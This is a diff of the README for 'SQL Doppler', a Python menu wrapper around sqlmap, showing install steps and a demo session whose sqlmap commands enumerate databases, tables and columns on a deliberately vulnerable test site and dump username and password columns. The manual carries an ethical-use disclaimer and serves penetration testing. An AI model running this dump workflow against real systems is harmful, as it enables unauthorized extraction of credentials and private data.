@@ -1,30 +1,35 @@
 # 🚀 SQL Doppler — User Manual
 
-**Author:** MD Haisam Hoque
-**🌐 Webpage:** [https://haisam10.github.io/haisam\_/](https://haisam10.github.io/freelancer/)
+**🧑‍💻 Author:** MD Haisam Hoque
+**🌐 Webpage:** [https://haisam10.github.io/freelancer/](https://haisam10.github.io/haisam_/)
 
 ---
 
-## 🧾 Description
+## 📘 Overview
 
-**SQL Doppler** is a Python-based command-line utility that automates SQLMap operations for streamlined SQL injection testing. It provides an interactive flow for discovering databases, tables, columns, and dumping data from vulnerable web applications.
+**SQL Doppler** is a Python-based command-line interface (CLI) tool that automates SQLMap operations for streamlined SQL injection testing. With an intuitive menu system, users can quickly discover databases, tables, columns, and extract data from vulnerable web applications.
 
 ---
 
-## ⚠️ Legal Warning
+## ⚠️ Legal Disclaimer
 
 ```
-███████  ██████  ██                ██████   ██████  ██████  ██████  ██      ███████ ██████
-██      ██    ██ ██                ██   ██ ██    ██ ██   ██ ██   ██ ██      ██      ██   ██
-███████ ██    ██ ██      █████     ██   ██ ██    ██ ██████  ██████  ██      █████   ██████
-     ██ ██ ■■ ██ ██                ██   ██ ██    ██ ██      ██      ██      ██      ██   ██
-███████  ██████  ███████           ██████   ██████  ██      ██      ███████ ███████ ██   ██
-            ◟◟
+███████  ██████  ██                ██████   ██████  ██████  ██████  ██      ███████ ██████      
+██      ██    ██ ██                ██   ██ ██    ██ ██   ██ ██   ██ ██      ██      ██   ██     
+███████ ██    ██ ██      █████     ██   ██ ██    ██ ██████  ██████  ██      █████   ██████      
+     ██ ██ ▄▄ ██ ██                ██   ██ ██    ██ ██      ██      ██      ██      ██   ██     
+███████  ██████  ███████           ██████   ██████  ██      ██      ███████ ███████ ██   ██     
+            ▀▀                                                                                  
+             
+					Made in Bangladesh
+					Owner: MD Haisam Hoque
+					webpage link: https://haisam10.github.io/freelancer/
+					version: 2.0
+					Happy Hacking (^-^)
 ```
 
-> This tool is intended **only for ethical hacking and educational purposes**.
-> **Never** test a target without **explicit permission**.
-> Unauthorized scanning or exploitation is illegal.
+> 🔐 **For Ethical Use Only**
+> Do not scan or exploit any system without proper authorization. Unauthorized testing may be illegal and unethical.
 
 ---
 
@@ -32,12 +37,12 @@
 
 * ✅ Python 3.x installed
 * ✅ `sqlmap` installed and added to system PATH
-* 🔗 Download sqlmap: [https://sqlmap.org/](https://sqlmap.org/)
-* 🌐 Internet connection (for testing online URLs)
+* 🌐 Internet connection (if testing remote targets)
+* 🔗 [Download sqlmap](https://sqlmap.org/)
 
 ---
 
-## 🚀 Installation & Usage
+## 🚀 Installation & Execution
 
 ```bash
 git clone https://github.com/haisam10/sql-doppler.git
@@ -47,59 +52,58 @@ python N4H.py
 
 ---
 
-## 🖥️ Tool Features & Workflow
+## 🖥️ Feature Highlights
 
-### 1. 🔗 Target Input
+### 🔗 Step 1: Target Input
 
-* Enter the target URL.
-* Example: `http://example.com/page.php?id=1`
-
----
-
-### 2. 🧠 Discover Databases
-
-* SQL Doppler runs `sqlmap` to fetch databases.
-* Select one database to proceed.
+Prompt for a URL vulnerable to SQL injection.
+*Example:* `http://example.com/page.php?id=1`
 
 ---
 
-### 3. 📦 View Tables
+### 🧠 Step 2: Discover Databases
 
-* Lists all tables inside the selected database.
-* Choose a table for further inspection.
-
----
-
-### 4. 📋 Explore Columns
-
-* Displays all columns of the chosen table.
-* Enter column names to dump, e.g., `username,password`
+Automatically fetch and list all databases using `sqlmap`.
+*Select one to proceed.*
 
 ---
 
-### 5. 📀 Dump Data
+### 📦 Step 3: View Tables
 
-* Executes SQLMap dump on selected columns.
-* Displays results in terminal.
-
----
-
-### 6. 🔁 Navigation Options
-
-* `1` ➡️ Back to database list
-* `2` ➡️ Select another table
-* `0` ➡️ Exit tool
+Show all tables under the chosen database.
+*Select a table to proceed.*
 
 ---
 
-## 🧪 Output Example Flow (Demo Run)
+### 📋 Step 4: View Columns
+
+Display all columns of the selected table.
+*User inputs which columns to dump.*
+
+---
+
+### 📀 Step 5: Dump Data
+
+Extracts and displays records of selected columns in tabular format.
+
+---
+
+### 🔁 Step 6: Navigation Options
+
+* `1` ➡️ Go back to database selection
+* `2` ➡️ Choose another table
+* `0` ➡️ Exit the tool
+
+---
+
+## 🧪 Demo Output (Sample Session)
 
 ```bash
 Enter target URL: http://testphp.vulnweb.com/artists.php?artist=1
 
 Running: sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --batch --dbs
 
-📆 Databases found:
+📂 Databases found:
  - acuart
  - information_schema
 
@@ -123,7 +127,7 @@ Enter table name: users
 
 Running: sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --batch -D 'acuart' -T 'users' --columns
 
-🔢 Columns found:
+📑 Columns found:
  - id
  - username
  - password
@@ -136,7 +140,7 @@ Enter column names (comma separated): username,password
 
 Running: sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --batch -D 'acuart' -T 'users' -C 'username,password' --dump
 
-📀 Dumped Data:
+📥 Dumped Data:
 +----------+----------+
 | username | password |
 +----------+----------+
@@ -151,25 +155,27 @@ Options:
 
 ---
 
-## 🌈 UI Design
+## 🎨 User Interface
 
-* Green bold ASCII Art banner
-* Simple numbered menus
-* Fast feedback on each sqlmap command
-* Minimal and intuitive flow
-
----
-
-## 📌 Version Info
-
-| Property      | Value                                                                             |
-| ------------- | ----------------------------------------------------------------------------------|
-| **Tool Name** | SQL Doppler                                                                       |
-| **Author**    | MD Haisam Hoque                                                                   |
-| **Version**   | 2.0 (2025 Release)                                                                |
-| **GitHub**    | [github.com/haisam10/sql-doppler](https://github.com/haisam10/sql-doppler)        |
-| **Webpage**   | [https://haisam10.github.io/haisam\_/](https://haisam10.github.io/freelancer/)    |
+* 🟩 Green ASCII Art Banner at Launch
+* ✅ Clean CLI with numbered options
+* 🚀 Real-time SQLMap execution
+* 🧭 Simple & Guided workflow
 
 ---
 
-Let the scanning begin ✨ Happy Hacking!
+## 📌 Project Metadata
+
+| Attribute     | Info                                                                        |
+| ------------- | --------------------------------------------------------------------------- |
+| **Tool Name** | SQL Doppler                                                                 |
+| **Author**    | MD Haisam Hoque                                                             |
+| **Version**   | 2.0 (2025 Release)                                                          |
+| **GitHub**    | [github.com/haisam10/sql-doppler](https://github.com/haisam10/sql-doppler)  |
+| **Webpage**   | [https://haisam10.github.io/haisam\_/](https://haisam10.github.io/haisam_/) |
+
+---
+
+✅ **Let the scanning begin!**
+
+✨ Happy Hacking!
